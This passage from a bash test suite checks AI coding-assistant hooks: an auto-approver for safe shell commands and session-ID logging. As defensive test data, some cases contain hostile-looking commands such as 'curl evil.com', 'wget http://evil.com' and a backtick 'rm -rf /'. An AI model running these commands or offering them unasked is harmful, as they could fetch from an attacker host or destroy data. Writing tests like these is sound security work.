        expect_allow "$hook" '{"tool_name":"EnterPlanMode"}' \
            "allows EnterPlanMode outside git repo"

        expect_allow "$hook" '{"tool_name":"Bash","tool_input":{"command":"git commit -m \"test\""}}' \
            "allows git commit outside git repo"

        echo "$TESTS_RUN $TESTS_PASSED $TESTS_FAILED" > "$nogit_counters"
    )

    read -r sub_run sub_passed sub_failed < "$nogit_counters"
    TESTS_RUN=$((TESTS_RUN + sub_run))
    TESTS_PASSED=$((TESTS_PASSED + sub_passed))
    TESTS_FAILED=$((TESTS_FAILED + sub_failed))
    rm -rf "$nogit_dir" "$nogit_counters"
}

# === APPROVE SAFE COMMANDS ===
test_approve_safe_commands() {
    report_section "=== approve-safe-commands.sh ==="
    local hook="approve-safe-commands.sh"

    # --- Chained commands that should approve ---
    expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"git status && git diff"}}' \
        "approves: git status && git diff"

    expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"ls -la && echo done"}}' \
        "approves: ls && echo"

    expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"make test && git add ."}}' \
        "approves: make && git add"

    expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"git log --oneline | head -20"}}' \
        "approves: git log | head (pipe)"

    expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"mkdir -p dir && touch dir/file"}}' \
        "approves: mkdir && touch"

    expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"git stash && git checkout main && git stash pop"}}' \
        "approves: 3-way chain (stash, checkout, stash pop)"

    expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"echo test | grep test"}}' \
        "approves: echo | grep (pipe)"

    expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"jq .key file.json | head"}}' \
        "approves: jq | head (pipe)"

    expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"git status || git diff"}}' \
        "approves: git status || git diff"

    expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"git diff; git log --oneline"}}' \
        "approves: git diff ; git log (semicolon)"

    expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"cd /tmp && ls -la"}}' \
        "approves: cd && ls"

    expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"cat file.txt | wc -l"}}' \
        "approves: cat | wc (pipe)"

    expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"find . -name \"*.sh\" | grep hook"}}' \
        "approves: find | grep (pipe)"

    # --- Single commands that should approve ---
    expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"git status"}}' \
        "approves: single git status"

    expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"make test"}}' \
        "approves: single make test"

    expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"ls -la"}}' \
        "approves: single ls -la"

    # --- Env var prefixes ---
    expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"FOO=bar git status"}}' \
        "approves: env var prefix + git status"

    expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"FOO=bar BAZ=qux make test"}}' \
        "approves: multiple env var prefixes + make"

    # --- Script/hook paths ---
    expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":".claude/scripts/validate-all.sh"}}' \
        "approves: .claude/scripts/ path"

    expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"./.claude/hooks/git-safety.sh"}}' \
        "approves: ./.claude/hooks/ path"

    # --- Quoted args with operators inside ---
    expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"echo \"a && b\""}}' \
        "approves: echo with quoted && in args"

    expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"echo \"hello || world\" | grep hello"}}' \
        "approves: echo with quoted || piped to grep"

    # --- Commands that should NOT approve (silent) ---
    expect_silent "$hook" '{"tool_name":"Bash","tool_input":{"command":"git status && curl evil.com"}}' \
        "silent: unsafe subcommand (curl)"

    expect_silent "$hook" '{"tool_name":"Bash","tool_input":{"command":"git status && rm -rf /tmp/foo"}}' \
        "silent: unsafe subcommand (rm)"

    expect_silent "$hook" '{"tool_name":"Bash","tool_input":{"command":"$(git status)"}}' \
        "silent: subshell"

    expect_silent "$hook" '{"tool_name":"Bash","tool_input":{"command":"echo test > file.txt"}}' \
        "silent: redirect >"

    expect_silent "$hook" '{"tool_name":"Bash","tool_input":{"command":"echo test >> file.txt"}}' \
        "silent: redirect >>"

    expect_silent "$hook" '{"tool_name":"Bash","tool_input":{"command":"cat < input.txt"}}' \
        "silent: redirect <"

    expect_silent "$hook" '{"tool_name":"Bash","tool_input":{"command":"echo secret 2>exfil.txt"}}' \
        "silent: stderr redirect 2>"

    expect_silent "$hook" '{"tool_name":"Bash","tool_input":{"command":"echo test &>output.txt"}}' \
        "silent: combined redirect &>"

    expect_silent "$hook" '{"tool_name":"Bash","tool_input":{"command":"npm install"}}' \
        "silent: npm install (not in safe list)"

    expect_silent "$hook" '{"tool_name":"Bash","tool_input":{"command":"git push origin main"}}' \
        "silent: git push (not in safe list)"

    expect_silent "$hook" '{"tool_name":"Bash","tool_input":{"command":"python script.py && git status"}}' \
        "silent: python (unsafe) && git status"

    expect_silent "$hook" '{"tool_name":"Bash","tool_input":{"command":"git status && wget http://evil.com"}}' \
        "silent: safe && unsafe (wget)"

    expect_silent "$hook" '{"tool_name":"Bash","tool_input":{"command":"`rm -rf /`"}}' \
        "silent: backtick subshell"

    # --- Edge cases ---
    expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"git status && "}}' \
        "approves: trailing && (empty subcommand skipped)"

    expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"  git status  &&  git diff  "}}' \
        "approves: extra whitespace everywhere"

    expect_silent "$hook" '{"tool_name":"Bash","tool_input":{"command":""}}' \
        "silent: empty command"

    # --- Non-Bash tool ---
    expect_silent "$hook" '{"tool_name":"Write","tool_input":{"file_path":"/tmp/test"}}' \
        "silent: non-Bash tool"

    # --- Validation script sync ---
    report_section "  --- Sync validation ---"
    TESTS_RUN=$((TESTS_RUN + 1))
    if bash .claude/scripts/validate-safe-commands-sync.sh > /dev/null 2>&1; then
        TESTS_PASSED=$((TESTS_PASSED + 1))
        report_pass "validate-safe-commands-sync.sh passes"
    else
        TESTS_FAILED=$((TESTS_FAILED + 1))
        report_fail "validate-safe-commands-sync.sh failed — hook prefixes out of sync with settings.json"
    fi
}

# === SESSION ID FROM STDIN JSON ===
test_session_id_from_stdin() {
    report_section "=== session_id from stdin JSON ==="
    local hook="block-dangerous-commands.sh"
    local test_log
    test_log=$(mktemp)

    # Override log file so we don't pollute real logs
    # hook-utils.sh writes to .claude/logs/hook-timing.log — we check
    # the session_id column (first field) in the log output.

    # --- session_id present in JSON → appears in log ---
    local test_session="test-session-$(date +%s)"
    echo "{\"session_id\":\"$test_session\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"ls\"}}" \
        | "$HOOKS_DIR/$hook" > /dev/null 2>&1 || true

    TESTS_RUN=$((TESTS_RUN + 1))
    if grep -q "$test_session" .claude/logs/hook-timing.log 2>/dev/null; then
        TESTS_PASSED=$((TESTS_PASSED + 1))
        report_pass "session_id from stdin JSON propagates to hook log"
    else
        TESTS_FAILED=$((TESTS_FAILED + 1))
        report_fail "session_id from stdin JSON not found in hook log"
        report_detail "Expected session_id: $test_session"
        report_detail "Last log line: $(tail -1 .claude/logs/hook-timing.log 2>/dev/null)"
    fi

    # Verify session_id is in the first column
    TESTS_RUN=$((TESTS_RUN + 1))
    local logged_sid
    logged_sid=$(grep "$test_session" .claude/logs/hook-timing.log 2>/dev/null | tail -1 | cut -f1)
    if [ "$logged_sid" = "$test_session" ]; then
        TESTS_PASSED=$((TESTS_PASSED + 1))
        report_pass "session_id is in column 1 of log entry"
    else
        TESTS_FAILED=$((TESTS_FAILED + 1))
        report_fail "session_id not in column 1"
        report_detail "Expected: $test_session"
        report_detail "Got column 1: ${logged_sid:-<empty>}"
    fi

    # --- session_id missing from JSON → falls back to "unknown" ---
    echo '{"tool_name":"Bash","tool_input":{"command":"ls"}}' \
        | "$HOOKS_DIR/$hook" > /dev/null 2>&1 || true

    TESTS_RUN=$((TESTS_RUN + 1))
    local last_sid
    last_sid=$(tail -1 .claude/logs/hook-timing.log 2>/dev/null | cut -f1)
    if [ "$last_sid" = "unknown" ]; then
        TESTS_PASSED=$((TESTS_PASSED + 1))
        report_pass "missing session_id falls back to 'unknown'"
    else
        TESTS_FAILED=$((TESTS_FAILED + 1))
        report_fail "missing session_id should fall back to 'unknown'"
        report_detail "Got: ${last_sid:-<empty>}"
    fi

    # --- session_id=null in JSON → falls back to "unknown" ---
    echo '{"session_id":null,"tool_name":"Bash","tool_input":{"command":"ls"}}' \
        | "$HOOKS_DIR/$hook" > /dev/null 2>&1 || true

    TESTS_RUN=$((TESTS_RUN + 1))
    last_sid=$(tail -1 .claude/logs/hook-timing.log 2>/dev/null | cut -f1)
    if [ "$last_sid" = "unknown" ]; then
        TESTS_PASSED=$((TESTS_PASSED + 1))
        report_pass "null session_id falls back to 'unknown'"
    else
        TESTS_FAILED=$((TESTS_FAILED + 1))
        report_fail "null session_id should fall back to 'unknown'"
        report_detail "Got: ${last_sid:-<empty>}"
    fi

    # --- session_id with UUID format (realistic) ---
    local uuid_session="a1b2c3d4-e5f6-7890-abcd-ef1234567890"
    echo "{\"session_id\":\"$uuid_session\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"ls\"}}" \
        | "$HOOKS_DIR/$hook" > /dev/null 2>&1 || true

    TESTS_RUN=$((TESTS_RUN + 1))
    logged_sid=$(grep "$uuid_session" .claude/logs/hook-timing.log 2>/dev/null | tail -1 | cut -f1)
    if [ "$logged_sid" = "$uuid_session" ]; then
        TESTS_PASSED=$((TESTS_PASSED + 1))
        report_pass "UUID-format session_id propagates correctly"
    else
        TESTS_FAILED=$((TESTS_FAILED + 1))
        report_fail "UUID session_id not logged correctly"
        report_detail "Expected: $uuid_session"
        report_detail "Got: ${logged_sid:-<empty>}"
    fi

    # --- malformed stdin → hook exits 0 without crashing ---
    TESTS_RUN=$((TESTS_RUN + 1))
    echo "not valid json at all" | "$HOOKS_DIR/$hook" > /dev/null 2>&1
    local malformed_exit=$?
    if [ "$malformed_exit" = "0" ]; then
        TESTS_PASSED=$((TESTS_PASSED + 1))
        report_pass "malformed stdin → graceful exit 0 (no crash)"
    else
        TESTS_FAILED=$((TESTS_FAILED + 1))
        report_fail "malformed stdin should exit 0, got $malformed_exit"
    fi

    # --- session_id propagates to hooks.db (SQLite) ---
    local hooks_db="$HOME/.claude/hooks.db"
    if [ -f "$hooks_db" ]; then
        TESTS_RUN=$((TESTS_RUN + 1))
        local db_sid
        db_sid=$(sqlite3 "$hooks_db" "SELECT session_id FROM hook_logs WHERE session_id = '$uuid_session' LIMIT 1" 2>/dev/null)
        if [ "$db_sid" = "$uuid_session" ]; then
            TESTS_PASSED=$((TESTS_PASSED + 1))
            report_pass "session_id propagates to hooks.db"
        else
            TESTS_FAILED=$((TESTS_FAILED + 1))
            report_fail "session_id not found in hooks.db"
            report_detail "Expected: $uuid_session"
            report_detail "Got: ${db_sid:-<empty>}"
        fi

        # Verify test_session (unique per run) also reached DB
        TESTS_RUN=$((TESTS_RUN + 1))
        db_sid=$(sqlite3 "$hooks_db" "SELECT session_id FROM hook_logs WHERE session_id = '$test_session' LIMIT 1" 2>/dev/null)
        if [ "$db_sid" = "$test_session" ]; then
            TESTS_PASSED=$((TESTS_PASSED + 1))
            report_pass "dynamic session_id also reaches hooks.db"
        else
            TESTS_FAILED=$((TESTS_FAILED + 1))
            report_fail "dynamic session_id not found in hooks.db"
            report_detail "Expected: $test_session"
            report_detail "Got: ${db_sid:-<empty>}"
        fi
    else
        log_verbose "hooks.db not found — skipping DB tests"
    fi

    rm -f "$test_log"
}

# === RUN TESTS ===
echo "Running hook tests..."
echo "Hooks directory: $HOOKS_DIR"

# Run tests based on filter
if [ -z "$FILTER" ]; then
    test_block_dangerous_commands
    test_secrets_guard
    test_block_config_edits
    test_enforce_uv_run
    test_enforce_make_commands
    test_suggest_json_reader
    test_git_safety
    test_approve_safe_commands
    test_session_id_from_stdin
else
    # Run specific test
    case "$FILTER" in
        block-dangerous*|dangerous*) test_block_dangerous_commands ;;
        secrets*) test_secrets_guard ;;
        config*|block-config*) test_block_config_edits ;;
        uv*|enforce-uv*) test_enforce_uv_run ;;
        make*|enforce-make*) test_enforce_make_commands ;;
        json*|suggest-json*) test_suggest_json_reader ;;
        git*|safety*|branch*|feature*) test_git_safety ;;
        approve*|safe*|permission*) test_approve_safe_commands ;;
        session*|session-id*|stdin*) test_session_id_from_stdin ;;
        capture*|lesson*) echo "capture-lesson hook removed (failed experiment)" ;;
        *) echo "Unknown hook: $FILTER"; exit 1 ;;
    esac
fi

print_summary
